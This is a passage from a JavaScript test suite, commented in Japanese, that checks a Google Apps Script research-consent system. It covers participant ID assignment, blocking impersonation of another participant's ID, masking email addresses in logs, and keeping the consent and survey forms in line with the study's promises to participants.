  t.forEach(([label, rows, want]) => {
    // ⚠️★★ **見出しを付けない裸のシート**で撃つ（`raw: true`）。
    //   ★ 2026-08-29 にスタブへ見出し 2 行を足したところ、⚠️ どのケースも `last >= 3` になり、
    //     **「1 行だけのロスター」を撃つケースが消えた**（★ 変異テストが検出した:
    //     `last >= 1` を `last > 1` に壊しても緑のままだった）。
    const got = ctx.o1NextParticipantId_(makeSheet(rows, { raw: true }));
    push("§4 " + label, got === want, { want, got });
  });
}

// ============================================================
// §5 提出トリガ（★ 冪等・1 人に 2 つの ID を作らない）
// ============================================================
{
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "old@example.com",
      [ctx.Q_O1_PID]: "",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  push("§5 ★ 既存メールでは再発番しない（冪等）", roster.__rows.length === 1, {
    rows: roster.__rows.length,
  });
  push(
    "§5 ★ 既存でも受付メールは届く",
    ctx.__mails.length === 1 && ctx.__mails[0].body.indexOf("P006") >= 0,
    { mails: ctx.__mails.length }
  );
}

{
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_PID]: "",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§5 ★ 陽性対照: 新規は採番されロスターに 1 行増える",
    roster.__rows.length === 2 && roster.__rows[1][0] === "P007",
    { rows: roster.__rows.length, pid: roster.__rows[1] && roster.__rows[1][0] }
  );
  push(
    "§5 ★ 受付メールに新しい P-ID が入る",
    ctx.__mails.length === 1 && ctx.__mails[0].body.indexOf("P007") >= 0,
    { mails: ctx.__mails.length }
  );
}

{
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "Old@Example.COM"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "old@example.com",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  push("§5 メールの大文字小文字を無視して既存と照合する", roster.__rows.length === 1, {
    rows: roster.__rows.length,
  });
}

{
  // ⚠️★★★ **他人の P-ID を名乗る経路**（security-checker が 2026-08-28 に発見）。
  //   ★ O1-C の P-ID 欄は自由記入・任意で、フォーム URL は被験者に配られる。
  //   ⚠️ 旧実装は P-ID 一致だけで既存扱いにしていたので、B の数週間ぶんの常時打鍵ログが
  //     A の P-ID で提出され、★ A からの削除要求が**履行不能**になった。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "別人",
      [ctx.Q_O1_EMAIL]: "another@example.com",
      [ctx.Q_O1_PID]: "p006",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  push(
    "§5 ★★★ 他人の P-ID を名乗っても、その ID で受け付けない",
    ctx.__mails.length === 0,
    { mails: ctx.__mails.length }
  );
  push(
    "§5 ★★ 取り違えのとき勝手に新規発番もしない（★ 同じ人に 2 つの ID を作らない）",
    roster.__rows.length === 1,
    { rows: roster.__rows.length }
  );
  push(
    "§5 ★ 取り違えを研究者が追えるようログに残す",
    ctx.__logs.some((l) => l.indexOf("別のメールアドレスが登録されています") >= 0),
    {}
  );
}

{
  // ★ 陽性対照: 申告した P-ID の行の**メールが空**なら、正当な経路として採用する
  //   （★ 氏名だけ先に入れた行を埋める運用）。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", ""]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "old@example.com",
      [ctx.Q_O1_PID]: "p006",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  push(
    "§5 ★ 陽性対照: 申告先の行のメールが空なら既存として採用する",
    roster.__rows.length === 1 &&
      ctx.__mails.length === 1 &&
      ctx.__mails[0].body.indexOf("P006") >= 0 &&
      roster.__rows[0][2] === "old@example.com",
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
}

{
  // ⚠️★★★ **P-ID 列が空でメールだけ一致する行**（code-reviewer が 2026-08-28 に実測）。
  //   ★ 旧実装は `found.pid` が空なので else に落ち、**同じメールに 2 行目**を作っていた
  //     （＝ 1 人に 2 つの識別子。★ 本ファイルが冒頭で禁じている状態）。
  // ⚠️ ロスターには**他の参加者の行も要る**（★ T-23 の「P-ID の行が 1 つも無いシートは
  //   ロスターではない」検査に引っかからない、実物どおりの形にする）。
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "他", "other@example.com"],
      ["", "既存", "dup@example.com"],
    ],
  });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "dup@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§5 ★★★ P-ID が空の行に当たっても行を増やさない（★ その行に採番して埋める）",
    roster.__rows.length === 2 && /^P\d{3}$/.test(roster.__rows[1][0]),
    { rows: roster.__rows.length, pid: roster.__rows[1][0] }
  );
}

{
  const ctx = makeReadyCtx();
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(makeResponse({ [ctx.Q_O1_NAME]: "無記名", [ctx.Q_O1_EMAIL]: "" }));
  push(
    "§5 メールが空なら発番しない",
    roster.__rows.length === 1 && ctx.__mails.length === 0,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
}

{
  const ctx = makeReadyCtx();
  ctx.__props.PHASE1_MGMT_SHEET_ID = "";
  const r = attempt(() =>
    ctx.onO1ConsentSubmit(
      makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
    )
  );
  push(
    "§5 採番元が無ければ中止する（例外にせずログに残す）",
    !r.threw && ctx.__mails.length === 0,
    { threw: r.threw, mails: ctx.__mails.length }
  );
}

{
  // ⚠️★★★ 受付メールに失敗したら「P-ID は確定済」をログに残すこと。
  //   ★ 残さないと、再提出は冪等スキップされるので**永久に届かない**。
  const ctx = makeReadyCtx();
  ctx.MailApp.sendEmail = () => {
    throw new Error("stub: quota exceeded");
  };
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "x@example.com",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  const logged = ctx.__logs.some((l) => l.indexOf("P-ID は確定済") >= 0 && l.indexOf("P007") >= 0);
  push("§5 ★★ 受付メール失敗時に P-ID をログへ残す（手で送れるように）", logged, { logged });
  push("§5 ★ 受付メールが失敗してもロックを解放する", ctx.__lock.released === true, {
    released: ctx.__lock.released,
  });
}

{
  // ⚠️★★ **申告された P-ID の形式**（Codex 指摘・2026-08-28）。
  //   ★ `P15` `p-015` `015` のような打ち間違いを、旧実装は**黙って「新規参加者」扱い**にし、
  //     ⚠️ メール未登録の既存参加者に **2 つ目の P-ID** を発番しえた。
  [
    ["P15A", "英字混じり"],
    ["p-015", "ハイフン入り"],
    ["015", "P が無い"],
    ["PP015", "P が 2 つ"],
  ].forEach(([bad, label]) => {
    const ctx = makeReadyCtx();
    const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
    ctx.onO1ConsentSubmit(
      makeResponse({
        [ctx.Q_O1_NAME]: "新規",
        [ctx.Q_O1_EMAIL]: "typo@example.com",
        [ctx.Q_O1_PID]: bad,
        [ctx.Q_O1_OS]: "Windows",
      })
    );
    push(
      `§5 ★★ 形式の違う P-ID（${label}）では発番も送信もしない`,
      roster.__rows.length === 1 && ctx.__mails.length === 0,
      { bad, rows: roster.__rows.length, mails: ctx.__mails.length }
    );
  });
}

{
  // ★ 陽性対照: 正しい形式（小文字）は通る。⚠️ 形式検証で全部止めていないこと。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", ""]] });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "ok@example.com",
      [ctx.Q_O1_PID]: "p006",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§5 ★ 陽性対照: 正しい形式（小文字 p006）は通る",
    ctx.__mails.length === 1 && ctx.__mails[0].body.indexOf("P006") >= 0,
    { mails: ctx.__mails.length }
  );
}

{
  // ⚠️★★ **ロスターの A 列が壊れている行**にメールが一致した場合（Codex 指摘）。
  //   ★ その値をそのまま受付メールに書くと、被験者は**存在しない ID**を信じて入力する。
  const ctx = makeReadyCtx({
    roster: [
      ["P006", "他", "other@example.com"],
      ["見出し", "既存", "broken@example.com"],
    ],
  });
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "broken@example.com",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  push(
    "§5 ★★ ロスターの P-ID 列が壊れている行では送信しない",
    ctx.__mails.length === 0,
    { mails: ctx.__mails.length }
  );
}

{
  // ★ フォーム側にも形式検証が入っていること（★ 提出前に本人が直せるのがいちばん安い）。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const pidItem = ctx.__forms[O1_C].__items.find((i) => i.__title === ctx.Q_O1_PID);
  push(
    "§6 ★ 参加者ID 欄にフォーム側の形式検証がある",
    !!pidItem && !!pidItem.__validation && !!pidItem.__validation.__pattern,
    { pattern: pidItem && pidItem.__validation && pidItem.__validation.__pattern }
  );
}

{
  // ⚠️★★★ **設定ミスで P-ID だけ焼かれる**のを防ぐ（code-reviewer 指摘・2026-08-28）。
  //   ★ 受付メールの本文が作れない設定なら、採番の**前に**止まること。
  const ctx = makeReadyCtx();
  ctx.__props.O1_APP_DOWNLOAD_URL = "";
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
  );
  push(
    "§5 ★★★ 受付メールを作れない設定なら P-ID を焼かない",
    roster.__rows.length === 1 && ctx.__mails.length === 0,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
  push(
    "§5 ★ そのとき「もう一度提出してもらう」案内をログに出す",
    ctx.__logs.some((l) => l.indexOf("もう一度提出") >= 0),
    {}
  );
}

{
  // ⚠️★★★ トリガ設置も fail-closed であること（★ 一番危ない入口が一番緩かった）。
  const ctx = makeReadyCtx();
  ctx.__props.O1_APP_DOWNLOAD_URL = "";
  ctx.__triggers.push({ getHandlerFunction: () => "onO1ConsentSubmit" });
  const r = attempt(() => ctx.installO1ConsentTrigger());
  push(
    "§5 ★★ 設定が欠けていればトリガを張らない",
    r.threw && !ctx.__triggers.some((t) => t.__fn === "onO1ConsentSubmit"),
    { threw: r.threw }
  );
  push(
    "§5 ★ そのとき既存のトリガを消さない（★ 失敗で現状を悪くしない）",
    ctx.__triggers.length === 1,
    { triggers: ctx.__triggers.length }
  );
}

{
  // ★ 陽性対照: 設定が揃っていればトリガは張られる。
  const ctx = makeReadyCtx();
  const r = attempt(() => ctx.installO1ConsentTrigger());
  push(
    "§5 ★ 陽性対照: 設定が揃えばトリガを張る",
    !r.threw && ctx.__triggers.length === 1,
    { threw: r.threw, triggers: ctx.__triggers.length }
  );
}

{
  // ⚠️★ 手動採番も**同じロック**を通ること（★ フォーム提出と重なると衝突する）。
  const ctx = makeReadyCtx({ lockFails: true });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  const r = attempt(() => ctx.assignO1ParticipantId());
  push(
    "§5 ★★ 手動採番もロックを取る（取れなければ何も書かない）",
    r.threw && roster.__rows.length === 1,
    { threw: r.threw, rows: roster.__rows.length }
  );
}

{
  const ctx = makeReadyCtx({ lockFails: true });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
  );
  push(
    "§5 ロックを取れなければ採番しない（同時提出で ID が衝突しない）",
    roster.__rows.length === 1,
    { rows: roster.__rows.length }
  );
}

{
  // ⚠️ ログに実アドレスを残さない（data-privacy）。
  const ctx = makeReadyCtx();
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "secret.person@example.com" })
  );
  const leaked = ctx.__logs.some((l) => l.indexOf("secret.person@example.com") >= 0);
  push("§5 ★ ログに実メールアドレスを残さない", !leaked, { leaked });
  push("§5 マスクは 1 文字目とドメインだけ残す", ctx.o1MaskEmail_("abc@x.jp") === "a***@x.jp", {
    got: ctx.o1MaskEmail_("abc@x.jp"),
  });
  push("§5 短すぎるアドレスは丸ごと伏せる", ctx.o1MaskEmail_("a@x.jp") === "***", {
    got: ctx.o1MaskEmail_("a@x.jp"),
  });
}

// ============================================================
// §6 ⚠️★★★ 構築 → 回答取得の往復（★ 設問タイトルの契約）
// ============================================================
{
  // ★★ **これが最も強い検査**である。構築側と取得側で定数がずれると、
  //   ⚠️ 提出されても氏名やメールが取れず、**黙って発番が止まる**（エラーにならない）。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const titles = ctx.__forms[O1_C].__items.map((i) => i.__title);
  const pairs = {};
  titles.forEach((t) => {
    if (t === ctx.Q_O1_NAME) pairs[t] = "山田";
    else if (t === ctx.Q_O1_EMAIL) pairs[t] = "y@example.com";
    else if (t === ctx.Q_O1_PID) pairs[t] = "p010";
    else if (t === ctx.Q_O1_OS) pairs[t] = "Mac";
  });
  const a = ctx.o1ConsentAnswers_(makeResponse(pairs).response);
  push(
    "§6 ★★★ 構築した設問から回答取得が 4 項目とも取れる（往復）",
    a.name === "山田" && a.email === "y@example.com" && a.pid === "P010" && a.os === "Mac",
    a
  );
}

{
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const form = ctx.__forms[O1_C];
  const checks = form.__items.filter((i) => i.__type === "CHECKBOX");
  push("§6 同意項目が 10 件以上ある", checks.length >= 10, { checks: checks.length });
  push(
    "§6 同意項目はすべて必須である",
    checks.length > 0 && checks.every((i) => i.__required === true),
    { required: checks.filter((i) => i.__required).length }
  );
  push(
    "§6 氏名・メールが必須である",
    form.__items.some((i) => i.__title === ctx.Q_O1_NAME && i.__required) &&
      form.__items.some((i) => i.__title === ctx.Q_O1_EMAIL && i.__required),
    {}
  );
  push(
    "§6 ★ 参加者ID は必須にしない（初参加の人は持っていない）",
    form.__items.some((i) => i.__title === ctx.Q_O1_PID && !i.__required),
    {}
  );
}

{
  // ⚠️★★★ **§6（宣言ブロック・録画）の同意をこのフォームで取らない。**
  //   ★ 同意文書 §6 は逐語「必ず個別に説明して同意をいただきます」と約束している。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const checks = ctx.__forms[O1_C].__items.filter((i) => i.__type === "CHECKBOX");
  const overreach = checks.filter(
    (i) => i.__title.indexOf("録画") >= 0 || i.__title.indexOf("宣言ブロック") >= 0
  );
  push(
    "§6 ★★★ 録画・宣言ブロックの同意をこのフォームで取らない（個別同意の約束）",
    overreach.length === 0,
    { overreach: overreach.map((i) => i.__title) }
  );
}

{
  // ★ 被験者への約束の数値が、本文と同意項目の両方に出ること。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const desc = ctx.__forms[O1_C].__description;
  const items = ctx.o1ConsentItemTitles_().join("\n");
  const inBoth = (s) => desc.indexOf(s) >= 0 && items.indexOf(s) >= 0;
  push("§6 「48 時間」が本文と同意項目の両方にある", inBoth("48 時間"), {});
  push("§6 保管上限（暗号化）が本文と同意項目の両方にある", inBoth(ctx.O1_RETENTION_ENCRYPTED), {});
  push("§6 保管上限（平文）が本文と同意項目の両方にある", inBoth(ctx.O1_RETENTION_PLAINTEXT), {});
  push("§6 保管上限（集計値）が本文と同意項目の両方にある", inBoth(ctx.O1_RETENTION_METRICS), {});
  push(
    "§6 ★ 本文に「記録しない」側（本文・アプリ名・URL）が明記されている",
    desc.indexOf("アプリの名前") >= 0 && desc.indexOf("URL") >= 0 && desc.indexOf("本文") >= 0,
    {}
  );
  push(
    "§6 ★ 宣言の 5 択が同意文書と同じ語で載っている（ADR-037）",
    ["論述", "通信文", "デザイン・映像・制作作業", "vibe coding", "その他・細切れの作業"].every(
      (s) => desc.indexOf(s) >= 0
    ),
    {}
  );
}

{
  // 2026-10-08: 識別子（v0.1.40 の o1_install_id）と、結果の公表・記録の公開の約束。
  //   配っているアプリ（v0.1.40）が識別子を記録するので、本文に無いまま始めない。
  //   約束を足したら同意項目も足す（o1ConsentItemTitles_ の注記）。上流の同意文書にも同じ約束がある。
  const ctx = makeReadyCtx();
  ctx.buildO1ConsentForm();
  const desc = ctx.__forms[O1_C].__description;
  const items = ctx.o1ConsentItemTitles_();
  const doc = fs.readFileSync(CONSENT_DOC, "utf8");
  push(
    "§6 本文に識別子（乱数・16 桁・端末ごとに分けるためだけ）の行がある",
    desc.indexOf("乱数の識別子（16 桁") >= 0 && desc.indexOf("記録を端末ごとに分けるためだけに使います") >= 0,
    {}
  );
  push("§6 同意文書にも識別子の行がある", doc.indexOf("乱数の識別子（16 桁）") >= 0, {});
  push(
    "§6 本文に結果の公表と記録の公開の節がある（取り除けない限界・あらためて尋ねる）",
    desc.indexOf("▼ 結果の公表と、記録の公開について") >= 0 &&
      desc.indexOf("公表済みの数値からあなたの分だけを取り除くことはできません") >= 0 &&
      desc.indexOf("同意をいただけた記録だけを公開します") >= 0,
    {}
  );
  push(
    "§6 同意文書にも公表と公開の節がある",
    doc.indexOf("結果の公表と、記録の公開について") >= 0 && doc.indexOf("同意をいただけた記録だけを公開します") >= 0,
    {}
  );
  const iPub = items.findIndex((x) => x.indexOf("公表され") >= 0 && x.indexOf("同意した記録だけが公開される") >= 0);
  const iKeep = items.findIndex((x) => x.indexOf("保管の上限") >= 0);
  const iQuit = items.findIndex((x) => x.indexOf("参加はいつでもやめられ") >= 0);
  push(
    "§6 公表の同意項目が、保管の上限の直後・やめられるの前にある",
    iPub >= 0 && iPub === iKeep + 1 && iQuit === iPub + 1,
    { iKeep, iPub, iQuit }
  );
}

{
  // ⚠️★★ 連絡先が同意文書 §7 と一致していること（★ 片方だけ直す事故の検査）。
  const ctx = makeReadyCtx();
  const doc = fs.readFileSync(CONSENT_DOC, "utf8");
  push(
    "§6 ★★ 連絡先メールが consent-draft-o1.md と一致する",
    doc.indexOf(ctx.O1_CONTACT_EMAIL) >= 0,
    { email: ctx.O1_CONTACT_EMAIL }
  );
  push("§6 ★★ 研究責任者名が consent-draft-o1.md と一致する", doc.indexOf(ctx.O1_CONTACT_NAME) >= 0, {
    name: ctx.O1_CONTACT_NAME,
  });
  push("§6 ★★ 所属が consent-draft-o1.md と一致する", doc.indexOf(ctx.O1_AFFILIATION) >= 0, {
    affiliation: ctx.O1_AFFILIATION,
  });
}

// ============================================================
// §7 ⚠️★★★ アンケートが約束を破らない
// ============================================================
{
  const ctx = makeReadyCtx();
  ctx.buildO1PostSurveyForm();
  const form = ctx.__forms[O1_S];
  const titles = form.__items.map((i) => i.__title);

  // ⚠️★★★ 同意文書 §4 の逐語「理由を聞きません」。
  //   ★ 事後に理由を尋ねれば、**約束は形の上で守られていても実質が破れる**
  //     （「あとで理由を聞かれる」なら被験者は止めにくくなる）。
  // ⚠️★★★ 2026-08-28: **この検査は一度すり抜けられている。**
  //   ★ 旧版は「タイトルに『理由』の語があるか」だけを見ていたので、
  //     「**記録を避けるために**、アプリを止めたり別の端末を使ったりしましたか」という
  //     ⚠️ **動機を尋ねる設問が緑のまま通った**（security-checker が発見）。
  //   → ★ 「なぜ」を表す語形（理由 / ため / なぜ / どうして）と、
  //     「止める・消す・避ける」系の語の**同居**を見る。
  const WHY = ["理由", "ため", "なぜ", "どうして", "動機"];
  const STOPPING = ["一時停止", "止め", "止し", "消す", "削除", "避け"];
  const asksWhy = titles
    .concat(form.__items.map((i) => i.__help))
    .filter((t) => t && WHY.some((w) => t.indexOf(w) >= 0) && STOPPING.some((s) => t.indexOf(s) >= 0))
    // ★ 「理由はお聞きしません」という**否定文**は当然よい（★ そこを弾くと文言が書けなくなる）。
    .filter((t) => t.indexOf("お聞きしません") < 0 && t.indexOf("聞きません") < 0);
  push("§7 ★★★ 一時停止・削除の「なぜ」を尋ねる設問・補足が無い", asksWhy.length === 0, {
    asksWhy,
  });

  push(
    "§7 ★ 「理由は聞かない」と本文に明記している",
    form.__description.indexOf("理由はお聞きしません") >= 0,
    {}
  );
  push("§7 受容性・負担の設問がある", titles.indexOf(ctx.Q_O1_S_BURDEN) >= 0, {});
  push("§7 一時停止の利用状況を（回数だけ）聞いている", titles.indexOf(ctx.Q_O1_S_PAUSE_USED) >= 0, {});
  push("§7 宣言 UI の使い勝手を聞いている", titles.indexOf(ctx.Q_O1_S_DECL_REPICK) >= 0, {});
  push(
    "§7 ★ reactivity（作業のしかたを変えたか）を聞いている",
    titles.some((t) => t.indexOf("作業のしかたを変え") >= 0),
    {}
  );
  push("§7 参加者ID が必須で P+数字 に検証される", (() => {
    const sid = form.__items.find((i) => i.__title === ctx.Q_O1_SUBJECT_ID);
    return !!sid && sid.__required && sid.__validation && sid.__validation.__pattern === "P[0-9]+";
  })(), {});
  push(
    "§7 ★ アンケートは氏名・メールを取らない（PII を増やさない）",
    !titles.some((t) => t === ctx.Q_O1_NAME || t === ctx.Q_O1_EMAIL),
    {}
  );
  push(
    "§7 ★ 「解析には使わない」と本文に書いてある",
    form.__description.indexOf("解析には使いません") >= 0,
    {}
  );
}

// ============================================================
// §8 migrate（★ 回答を保ったまま更新する経路）
// ============================================================
{
  const ctx = makeReadyCtx({ consentResponses: 5 });
  const form = ctx.__forms[O1_C];
  const added = ctx.migrateO1ConsentForm();
  push("§8 ★ 回答があっても migrate は設問を消さない", form.__deleted === 0, {
    deleted: form.__deleted,
  });
  push("§8 migrate が同意項目を追加する", added === ctx.o1ConsentItemTitles_().length, {
    added,
  });
  push(
    "§8 ★★ 追加時に「既存の回答者は同意していない」と警告する",
    ctx.__logs.some((l) => l.indexOf("同意していません") >= 0),
    {}
  );
}

{
  const ctx = makeReadyCtx({ consentResponses: 5 });
  ctx.migrateO1ConsentForm();
  const again = ctx.migrateO1ConsentForm();
  push("§8 ★ 2 回目の migrate は何も追加しない（冪等）", again === 0, { again });
}

// ============================================================
// §9 受付メールの中身（★ O1 固有の 4 点）
// ============================================================
{
  const ctx = makeReadyCtx();
  const body = ctx.o1RegisterAckBody_("P015");
  push("§9 受付メールに参加者 ID が入る", body.indexOf("P015") >= 0, {});
  push("§9 受付メールに配布 URL が入る", body.indexOf(ctx.__props.O1_APP_DOWNLOAD_URL) >= 0, {});
  push("§9 ★ 自動起動の案内が入る（研究者判断 2026-08-28）", body.indexOf("自動で立ち上がる") >= 0, {});
  push(
    "§9 ★ 3 点セット（印・一時停止・時間帯の削除）が入る",
    body.indexOf("印が出ていないとき") >= 0 &&
      body.indexOf("一時停止") >= 0 &&
      body.indexOf("時間帯を指定して削除") >= 0,
    {}
  );
  push("§9 ★ 48 時間の猶予が入る", body.indexOf("48 時間") >= 0, {});
  // ⚠️ O1 に課題ページは無い。G1 の文面を流用すると混ざる。
  push(
    "§9 ⚠️ 課題ページの話が 1 文字も入っていない（G1 の文面の混入検査）",
    body.indexOf("block") < 0 && body.indexOf("課題") < 0,
    {}
  );
  push("§9 ★ preview は送信しない", (() => {
    const c = makeReadyCtx();
    c.previewO1RegisterAckEmail();
    return c.__mails.length === 0 && c.__drafts.length === 0;
  })(), {});
}

// ============================================================
// §10 ⚠️ 秘密を置かない
// ============================================================
{
  const hardcoded = /(SHARED_SECRET|FOLDER_ID|O1_APP_DOWNLOAD_URL|PHASE1_MGMT_SHEET_ID|O1_MGMT_SHEET_ID|FORM_ID_O1_CONSENT|FORM_ID_O1_SURVEY)\s*=\s*['"][^'"]+['"]/.test(src);
  push("§10 ⚠️ .gs にシークレット / フォルダ ID を直書きしていない", !hardcoded, { hardcoded });
}

{
  // ★ 受け口 (`GSE_O1_Submit.gs`) の役目をこちらに持ち込んでいないこと。
  push(
    "§10 ★ 提出の受け口の関数（doPost）を持っていない",
    src.indexOf("function doPost") < 0,
    {}
  );
}

// ============================================================
// §11 ⚠️★★★ ロスターへの書き込みの防波堤（起票 T-22 / T-23 / T-24）
// ============================================================

{
  // --- T-22: OS を D 列に書く ---
  const ctx = makeReadyCtx();
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "新規",
      [ctx.Q_O1_EMAIL]: "new@example.com",
      [ctx.Q_O1_OS]: "Windows",
    })
  );
  push(
    "§11 T-22 ★ 新規行の D 列に OS が入る",
    roster.__rows.length === 2 && roster.__rows[1][3] === "Windows",
    { row: roster.__rows[1] }
  );
}

{
  // --- T-22: 既存行は「空のときだけ」補う（★ メール補充と同型） ---
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com", ""]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "old@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push("§11 T-22 ★ 既存行の空の D 列は補われる", roster.__rows[0][3] === "Mac", {
    row: roster.__rows[0],
  });
}

{
  // ⚠️★★ **陰性対照**: 既に入っている OS を上書きしない（★ 研究者が手で直した値を守る）。
  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com", "Windows(手入力)"]] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({
      [ctx.Q_O1_NAME]: "既存",
      [ctx.Q_O1_EMAIL]: "old@example.com",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  push(
    "§11 T-22 ⚠️ 既に入っている OS は上書きしない",
    roster.__rows[0][3] === "Windows(手入力)",
    { row: roster.__rows[0] }
  );
}

{
  // --- T-23: 見出しが違うシートは拒否する ---
  const ctx = makeReadyCtx({ rosterHeader: ["ID", "なまえ", "アドレス", "OS"] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
  );
  push(
    "§11 T-23 ⚠️★★★ 見出しが違うシートには書き込まない（fail-closed）",
    roster.__rows.length === 1 && ctx.__mails.length === 0,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
  push(
    "§11 T-23 ★ 理由をログに出す（★ 研究者が直せる形で）",
    ctx.__logs.some((l) => l.indexOf("参加者ロスターの形をしていません") >= 0),
    {}
  );
}

{
  // ⚠️★ **A 列だけ合っていて 2 列目以降が違う**シート（★ 列の照合そのものを撃つ）。
  //   ⚠️ これが無いと「見出し行を探す」検査だけで赤になり、**列の一致検査が空回り**していても気づけない。
  const ctx = makeReadyCtx({ rosterHeader: ["P-ID", "なまえ", "メール", "OS"] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
  );
  push(
    "§11 T-23 ⚠️ 2 列目以降が違う見出しも拒否する（★ 列の照合を撃つ）",
    roster.__rows.length === 1 && ctx.__mails.length === 0,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
}

{
  // ⚠️★★★ **新規に作った空のロスター**（見出しはあるが P-ID の行が無い）を弾く。
  //   ★ これが「O1 用のロスターを作ってしまった」ときの実際の形である。
  const ctx = makeReadyCtx({ roster: [] });
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
  );
  push(
    "§11 T-23 ⚠️★★★ 新規に作った空のロスターには採番しない（★ P001 衝突を防ぐ）",
    roster.__rows.length === 0 && ctx.__mails.length === 0,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
}

{
  // ★ **陽性対照**: 正しい形のロスターは通る（⚠️ 検査が全部止めているだけではない）。
  const ctx = makeReadyCtx();
  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
  ctx.onO1ConsentSubmit(
    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "ok@example.com" })
  );
  push(
    "§11 T-23 ★ 陽性対照: 正しいロスターなら通る",
    roster.__rows.length === 2 && ctx.__mails.length === 1,
    { rows: roster.__rows.length, mails: ctx.__mails.length }
  );
}

{
  // --- T-24: 同じ P-ID が 2 行あったら受付メールを送らない ---
  //
  // ⚠️★★★ **2026-09-03 に前提を書き直した**（★ 検査を弱めたのではない。設計が変わった）。
  //   ★ 旧テストは `appendRow` を差し替えて「O1 が書いた行と同じ P-ID の 2 行目」を作っていた。
